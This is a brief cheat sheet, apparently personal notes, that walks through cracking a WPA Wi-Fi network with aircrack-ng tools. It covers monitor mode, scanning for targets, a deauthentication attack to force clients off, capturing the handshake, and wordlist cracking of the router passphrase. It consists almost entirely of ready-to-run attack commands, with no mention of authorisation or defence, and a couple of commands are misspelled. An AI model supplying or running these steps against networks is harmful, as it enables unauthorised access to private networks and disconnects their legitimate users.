MUST Have external WIFI card (ALFA antenna)

# WIFI hacking Process

Place card in Monitor Mode
Discover Network information (SSID,Channel,BSSID)
Select network and capture data
Perform deauth attack
Capture WPA handshake
Attempt to crack the handshake

run iwconfig to ensure wireless card is present

airmon-ng check kill >> kills any process that may interrupt the process

airmon-ng start wlan0  >> set wireless card in monitor mode

airodump-ng wlan0mon  >> shows all connections close by (look for MAC (bssid) and name) lower power level is closer to the antenna

airodum-ng -c CHANNEL# --bssid MACADDRESS -w FILENAME wlan0mon 
	wait for handshake to appear OR perform deauth and listen for handshake

DEAUTH Attack
	aireplay-ng -0 1 -a BSSIDMAC -c CLIENTMAC wlan0mon
		May have to run multiple times,multiple clients, but you will get the handshake eventually
		.cap file that was produced can be used to crack the password, use wordlists to crack hashes

aircrack -w WORDLIST -b BSSIDMAC CAPTURE.CAP  >> find Router passphrase with wordlists
